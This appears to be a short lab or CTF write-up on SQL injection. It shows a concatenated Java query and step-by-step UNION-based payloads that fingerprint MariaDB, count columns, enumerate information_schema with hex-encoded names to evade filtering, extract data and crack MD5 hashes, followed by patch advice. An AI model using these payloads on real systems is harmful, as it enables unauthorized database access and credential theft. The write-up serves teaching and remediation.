🚨 **EXPLOIT**

#### SQL injection

Example of unsafe query constructed with concatenation of user input :

`String query = "SELECT \* FROM accounts WHERE custID='" + request.getParameter("id") + "'";`

#### Steps

1. Find the Database system

- We can find it easily here with the input "'" that tells us the system is MariaDB.

2. Find the number of columns returned from the original query

- `1 ORDER BY X` Keep increasing `X` until an error is caused.

3. Use Union to find the

=> tables names

`1 UNION SELECT NULL, table_name FROM information_schema.tables--`

=> columns names
`1 UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name=X`

Where X is converted in hex to avoid any filtering and any issue with the character "'".

4. Extract important information (the number of columns must match the original query)

`1 UNION SELECT a,b FROM C`

5. Decrypt from MD5

---

✅ **PATCH**

- Use prepared statements
- Use a safe API with a parameterized interface
- Sanitize the input server side (if a number is expected, only accept numbers, escape special characters like " ' , etc...")
- Use PDO in **php** or mysql_real_escape_string to prevent sql injection.
